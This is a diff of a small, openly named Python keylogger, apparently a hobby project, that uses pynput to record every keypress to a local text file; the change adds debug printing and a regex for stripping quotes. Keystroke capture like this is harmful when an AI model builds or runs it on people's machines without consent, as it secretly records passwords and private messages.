@@ -1,4 +1,5 @@
 from pynput.keyboard import Key, Listener
+from re import sub
 
 filename = "the_keylogger_i_made_log.txt"
 path = ".\\"
@@ -10,6 +11,7 @@ keys = []
 
 def on_press(key):
     global keys, count
+    print(f"key = {key}")
     keys.append(key)
     count += 1
 
@@ -25,8 +27,9 @@ def write_file(keys):
     with open(fullpath, "a") as f:
         for key in keys:
             # get rid of annoying single quotes
-            k = str(key).replace("'", "")
-            print(k)
+            k = sub(r"[\'\"](.*)[\'\"]", r"\1", str(key))
+
+            # print(f"k = {k}")
             if k.find("space") > 0:
                 f.write('\n')
                 f.close()
